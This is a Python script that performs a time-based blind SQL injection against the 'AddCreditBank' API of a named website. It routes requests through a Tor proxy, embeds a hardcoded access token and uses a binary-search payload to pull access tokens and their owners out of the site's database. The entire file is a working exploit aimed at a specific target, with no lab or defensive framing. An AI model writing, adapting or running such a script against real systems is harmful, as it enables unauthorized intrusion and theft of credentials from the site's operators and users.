#!/usr/bin/env python3
"""Fast binary search time-blind SQLi for cybermagic555.com"""
import requests
import time
import sys

PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
URL = "https://cybermagic555.com/api/AddCreditBank"
TOKEN = "gscAVZpq7eQeGqAprWEk4M7RX"
DELAY = 2
THRESHOLD = 3.5

def check(cond: str) -> bool:
    payload = f"1' AND IF({cond},SLEEP({DELAY}),0)-- -"
    files = {"BankLogID": (None, payload), "AccessToken": (None, TOKEN)}
    start = time.time()
    try:
        requests.post(URL, files=files, proxies=PROXY, timeout=30)
    except:
        pass
    return (time.time() - start) > THRESHOLD

def extract_byte(query: str, pos: int) -> int:
    """Binary search for ASCII value at position"""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if check(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    # Verify we have a printable char
    if check(f"ASCII(SUBSTRING(({query}),{pos},1))={lo}"):
        return lo
    return 0

def extract_string(query: str, max_len: int = 30) -> str:
    result = ""
    for pos in range(1, max_len + 1):
        byte = extract_byte(query, pos)
        if byte == 0 or byte < 32:
            break
        result += chr(byte)
        print(f"\r[+] {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[*] Binary search time-blind SQLi")
    print("[*] ~7 requests per character (vs 62 linear)")

    # Extract tokens
    for i in range(7):
        print(f"\n[*] Token {i}:")
        q = f"SELECT Token FROM access_token LIMIT {i},1"
        token = extract_string(q, 30)
        if not token:
            break
        print(f"    Token: {token}")

        # Get Owner
        q2 = f"SELECT Owner FROM access_token LIMIT {i},1"
        owner = extract_string(q2, 20)
        if owner:
            print(f"    Owner: {owner}")
